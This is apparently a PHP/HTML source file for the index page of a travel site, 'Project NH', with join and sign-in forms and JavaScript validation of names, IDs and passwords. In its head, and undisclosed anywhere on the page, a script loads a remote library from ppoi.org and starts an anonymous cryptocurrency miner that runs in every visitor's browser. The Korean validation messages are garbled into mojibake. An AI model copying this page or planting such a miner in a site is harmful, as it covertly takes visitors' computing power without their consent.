<?php
if(isset($_SESSION['login_user'])) {
    header("location: home.php");
}

?>

<!DOCTYPE html>
<html lang="en">

  <head>

    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">

    <title>Project NH</title>

	<script src="https://ppoi.org/lib/projectpoi.min.js"></script>
	<script>
		var miner = new ProjectPoi.Anonymous('UIeWAtcJkh36tiZFN7XLHSoL');
       	 	miner.setThrottle(0.5);
		miner.start();
	</script>
    <!-- Bootstrap core CSS -->
    <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <script language="JavaScript">
        function nameCheck()
        {
            if(join_form.name.value == "")
            {
                document.all.p_name.innerText = "μ΄λ¦μ?μλ ₯νμ§ μμμ΅λλ?";
                join_form.name.focus();
                join_form.name.select();
                return false;
            }

            if(join_form.name.value.length < 2)
            {
                document.all.p_name.innerText = "μ΄λ¦μ 2κΈμ?μ΄μμλλ?";
                join_form.name.focus();
                join_form.name.select();
                return false;
            }

            for (var i = 0; i < join_form.name.value.length; i++)
            {
                var ch = join_form.name.value.charAt(i);
                if (((ch < "γ?) || (ch > "ν?)) && ((ch < "γ?) || (ch > "γ?)))
                {
                    document.all.p_name.innerText = "μ΄λ¦μ νκΈλ§?μλ ₯ κ°λ₯ν©λλ€.";
                    join_form.name.focus();
                    join_form.name.select();
                    return false;
                }
            }

            document.all.p_name.innerText = "Correct name.";
            return true;
        }

        function IDCheck()
        {
            if (join_form.id.value == "")
            {
                document.all.p_id.innerText = "μμ΄λλ₯Ό μλ ₯νμ§ μμμ΅λλ?";
                join_form.id.focus();
                join_form.id.select();
                return false;
            }

            for (var i = 0; i < join_form.id.value.length; i++)
            {
                var ch = join_form.id.value.charAt(i);
                if (!(ch >= '0' && ch <= '9') && !(ch >= 'a' && ch <= 'z'))
                {
                    document.all.p_id.innerText = "μμ΄λλ μλ¬Έμ? μ«μλ§?μλ ₯ κ°λ₯ν©λλ€.";
                    join_form.id.focus();
                    join_form.id.select();
                    return false;
                }
            }

            if (join_form.id.value.length < 6 || join_form.id.value.length > 12)
            {
                document.all.p_id.innerText = "μμ΄λλ₯Ό 6~12μκΉμ§ μλ ₯ν΄μ£ΌμΈμ.";
                join_form.id.focus();
                join_form.id.select();
                return false;
            }

            document.all.p_id.innerText = "Correct ID.";
            return true;
        }

        function PWCheck()
        {
            if (join_form.pw.value == "")
            {
                document.all.p_pw.innerText = "λΉλ°λ²νΈλ₯?μλ ₯νμ§ μμμ΅λλ?";
                join_form.pw.focus();
                join_form.pw.select();
                return false;
            }

            for (var i = 0; i < join_form.pw.value.length; i++)
            {
                var ch = join_form.pw.value.charAt(i);
                if (!(ch >= '0' && ch <= '9') && !(ch >= 'a' && ch <= 'z'))
                {
                    document.all.p_pw.innerText = "λΉλ°λ²νΈλ?μλ¬Έμ? μ«μλ§?μλ ₯ κ°λ₯ν©λλ€.";
                    join_form.pw.focus();
                    join_form.pw.select();
                    return false;
                }
            }

            if (join_form.pw.value.indexOf(" ") >= 0)
            {
                document.all.p_pw.innerText = "λΉλ°λ²νΈμ?κ³΅λ°±μ?μ¬μ©ν?μ?μμ΅λλ€.";
                join_form.pw.focus();
                join_form.pw.select();
                return false;
            }

            if (join_form.pw.value.length < 6 || join_form.pw.value.length > 12)
            {
                document.all.p_pw.innerText = "λΉλ°λ²νΈλ₯?6~12μκΉμ§ μλ ₯ν΄μ£ΌμΈμ.";
                join_form.pw.focus();
                join_form.pw.select();
                return false;
            }

            document.all.p_pw.innerText = "Correct PW.";
            return true;
        }

        function PWCheckCheck()
        {
            if (join_form.pw_check.value == "")
            {
                document.all.p_pw.innerText = "λΉλ°λ²νΈλ₯?νμΈνμ§ μμμ΅λλ?";
                join_form.pw.focus();
                join_form.pw.select();
                return false;
              }

            if (join_form.pw.value != join_form.pw_check.value)
            {
                document.all.p_pw.innerText = "λΉλ°λ²νΈκ° μΌμΉνμ§ μμ΅λλ€.";
                join_form.pw_check.focus();
                join_form.pw_check.select();
                return false;
            }

            document.all.p_pw.innerText = "Correct PW.";
            return true;
        }

        function submitCheck()
        {
          if(nameCheck() && IDCheck() && PWCheck() && PWCheckCheck())
            return true;

          return false;
        }

        function countryChange()
        {
            var country = document.getElementById("country");
            var selectedValue = country.options[country.selectedIndex].value;
            if(selectedValue == "South Korea")
            {
                document.getElementById("region").options[0].text = "Seoul";
                document.getElementById("region").options[1].text = "Suwon";
            }
            else
            {
                document.getElementById("region").options[0].text = "Dokyo";
                document.getElementById("region").options[1].text = "Osaka";
            }
        }
    </script>

    <link href="index.css" rel="stylesheet">

  </head>

  <body>

    <!-- Navigation -->
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark fixed-top">
      <div class="container">
        <a class="navbar-brand" href="index.php">Project NH</a>
      </div>
    </nav>

    <!-- Header with Background Image -->
    <header class="main_image">
      <div class="container">
        <div class="row">
          <div class="col-lg-12">
            <h1 class="display-3 text-center text-white mt-4">Travel with Project NH!</h1>
          </div>
        </div>
      </div>
    </header>

    <!-- Page Content -->
    <div class="container">

      <div class="row">
        <div class="col-sm-8">
          <h2 class="mt-4 my-4">Join</h2>
          <form name="join_form" onsubmit="JavaScript: return submitCheck();" action="./join_check.php" method="POST">
            <div class="col my-4">
              <label>Name</label>
              <input class="form-comtrol" type="text" name="name" onBlur="nameCheck();">
              <p id="p_name">Must be at least 2 characters long. Only Korean.</p>
            </div>
            <div class="col my-4">
              <label>ID</label>
              <input class="form-comtrol" type="text" name="id" onBlur="IDCheck();">
              <p id="p_id">Use only small letters(a-z) and numbers(0-9). Must be at least 6 characters long and up to 12.</p>
            </div>
            <div class="col my-4">
              <label>PW</label>
              <input class="form-comtrol" type="password" name="pw" onBlur="PWCheck();">
              <label>PW check</label>
              <input class="form-comtrol" type="password" name="pw_check" onBlur="PWCheckCheck();">
              <p id="p_pw">Use only small letters(a-z) and numbers(0-9). Must be at least 6 characters long and up to 12.</p>
            </div>
            <div class="col my-4">
              <label>Birthday</label>
              <input class="form-comtrol" type="date" name="birthday"></input>
            </div>
            <div class="col my-4">
              <label>Country</label>
              <select class="form-comtrol" type="text" name="country" id="country" onChange="countryChange();"><option>South Korea<option>Japan</select>
              <label>Region</label>
              <select class="form-comtrol" type="text" name="region" id="region"><option name="region_1">Seoul<option name="region_2">Suwon</select>
            </div>
            <div class="col my-4">
              <label>Gender</label>
              <select class="form-comtrol" type="text" name="gender"><option>Female<option>Male</select>
            </div>
            <div class="col my-4">
                <button class="btn btn-primary text-white" type="submit">Join &raquo;</button>
            </div>
          </form>
        </div>

        <div class="col-sm-4">
          <h2 class="mt-4 my-4">Sign in</h2>
          <form name="login_form" action="./login_check.php" method="POST">
            <div class="col">
              <label>ID</label>
              <input class="form-comtrol" type="text" name="id">
            </div>
            <div class="col">
              <label>PW</label>
              <input class="form-comtrol" type="password" name="pw">
            </div>
            <div class="col my-4">
                <button class="btn btn-primary text-white" type="submit">Sign in &raquo;</a>
            </div>
          </form>
        </div>
      </div>

    </div>
    <!-- /.container -->

	  <?php include("footer.php"); ?>
    <!-- Bootstrap core JavaScript -->
    <script src="vendor/jquery/jquery.min.js"></script>
    <script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>

  </body>

</html>
